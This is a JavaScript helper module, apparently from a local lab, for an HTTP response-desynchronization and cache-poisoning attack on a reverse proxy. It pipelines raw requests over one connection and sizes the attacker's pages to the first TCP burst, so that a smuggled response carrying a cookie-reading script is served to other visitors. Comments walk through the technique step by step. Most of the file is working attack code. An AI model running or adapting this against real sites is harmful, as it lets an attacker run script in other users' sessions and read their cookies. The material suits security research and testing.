// Shared by attacker.mjs, traffic.mjs and fuzz.mjs.
import { connect } from 'node:net';

export const STORE = process.env.STORE ?? 'http://127.0.0.1:4400';
export const SITE = new URL(process.env.SITE ?? 'http://localhost:4000');

// The server writes the header block, then the body. On a new connection it may send 10 segments
// before the first acknowledgement, so the first burst holds 9 segments of body: 9 x 1448 bytes on a
// 1500-byte MTU. A page declared with exactly that length ends where the burst ends.
export const SIZE = Number(process.env.SIZE ?? 9 * 1448);

// How many complete responses stand after byte SIZE. The proxy hands the connection it just freed to
// the next request, which may be another one of the attacker's: with one copy he reads his own
// poison back and it is gone, with CHAIN copies the rest stay for whoever comes after.
export const CHAIN = Number(process.env.CHAIN ?? 1);

// The two pages of the attacker. NAME=dev-tools gives a pair that does not collide (the control).
//
// WHO is a second pair of the same shape, under names of its own: `WHO=nico` signs up `nico_dev` and
// `nico` and lands on `nico_dev_tools_index_html.mjs`. Nothing stops one person holding several, and
// one build holds all of them, each declared at a length of its own, so the attacker does not have to
// be right about the window and the MTU on the first try.
const WHO = process.env.WHO ?? 'mallory';
export const PAGES = [
  { user: `${WHO}_dev`, name: 'tools' },
  { user: WHO, name: process.env.NAME ?? 'dev_tools' },
];
export const pathOf = (page) => `/${page.user}/${page.name}`;

// The script the attacker wants other visitors to run. No `<`, `>` or `&`: Angular escapes those.
export const SCRIPT =
  "globalThis.mallory='script of mallory, running in '+location.origin+', cookie: '+document.cookie;" +
  'document.title=globalThis.mallory';

// The response he writes into his own page. Angular writes the line breaks as LF, and nginx takes
// LF-only header lines.
export const RESPONSE =
  `HTTP/1.1 200 OK\nContent-Type: text/javascript\nContent-Length: ${SCRIPT.length}\n\n${SCRIPT}`;

const request = (path, headers, last) =>
  `GET ${path} HTTP/1.1\r\nHost: ${SITE.host}\r\n${headers}${last ? 'Connection: close\r\n' : ''}\r\n`;

// One response out of a buffer: the header block, and the body up to the length it declares. `body`
// is capped there, `rest` is whatever came after it, which is where the next response begins.
function one(raw) {
  const split = raw.indexOf('\r\n\r\n');
  const head = raw.subarray(0, Math.max(split, 0)).toString('latin1');
  const header = (name) => head.match(new RegExp(`^${name}: (.*)$`, 'im'))?.[1]?.trim();
  const after = split < 0 ? Buffer.alloc(0) : raw.subarray(split + 4);
  const declared = Number(header('content-length') ?? NaN);
  const length = Number.isNaN(declared) ? after.length : Math.min(declared, after.length);
  return {
    status: Number(head.match(/^HTTP\/1\.1 (\d+)/)?.[1] ?? 0),
    head,
    type: header('content-type') ?? '-',
    cache: header('x-cache') ?? '-',
    declared,
    body: after.subarray(0, length),
    rest: after.subarray(length),
  };
}

// Requests on one connection, read until the other side closes. With one path this is a plain GET,
// and its `body` holds everything that arrived, so nothing here stops at Content-Length.
function fetchRaw(paths, headers) {
  return new Promise((done) => {
    const socket = connect(Number(SITE.port || 80), SITE.hostname);
    const parts = [];
    socket.on('connect', () =>
      socket.write(paths.map((path, i) => request(path, headers, i === paths.length - 1)).join('')),
    );
    socket.on('data', (part) => parts.push(part));
    socket.on('error', () => {});
    socket.setTimeout(15000, () => socket.destroy());
    socket.on('close', () => done(Buffer.concat(parts)));
  });
}

export async function get(path, headers = '') {
  const raw = await fetchRaw([path], headers);
  const response = one(raw);
  return { ...response, body: Buffer.concat([response.body, response.rest]) };
}

// Every path in one segment. The proxy answers them in order on this one connection and does no
// handshake and no accept in between, so the upstream connection it freed after the first request is
// the one it hands to the second, a few microseconds later. That is the whole of the attack: the rest
// of the page is still a round trip away and arrives into a connection that is in use again, not
// into one sitting idle in the pool, where the proxy would see it and close it.
export async function pipeline(paths, headers = '') {
  let raw = await fetchRaw(paths, headers);
  return paths.map(() => {
    const response = one(raw);
    raw = response.rest;
    return response;
  });
}

// What a visitor asks for: the two pages of the site, two pages of an account, and the bundle that
// runs them. The query on the home page is what keeps this read out of a cache under `/`, which is
// one of the URLs the attacker replaces.
export async function paths() {
  const home = await get('/?lab');
  const bundle = home.body.toString().match(/src="(main-[^"]+\.js)"/)?.[1];
  return ['/', '/legal/privacy', '/alice', '/alice/notes', `/${bundle}`];
}

// A query nobody has used, so a cache in front cannot answer the attacker's own read from a copy and
// the request reaches the server, where the short page is. The server ignores it: the route is
// prerendered, and the page comes back with the same bytes declared. The prefix is per run, because
// a counter alone repeats the keys of the run before and a cache then answers all of them.
const run = Math.random().toString(36).slice(2, 8);
let reads = 0;
export const uncached = (path) => `${path}?${run}-${(reads += 1)}`;

// Of the attacker's two URLs, the one the proxy reads short is the one declared with SIZE bytes. The
// other one holds the bytes, the response among them.
export async function pair() {
  const seen = await Promise.all(PAGES.map((page) => get(pathOf(page))));
  const lost = seen.findIndex((response) => response.declared === SIZE);
  return { seen, lost, read: lost < 0 ? undefined : pathOf(PAGES[lost]) };
}
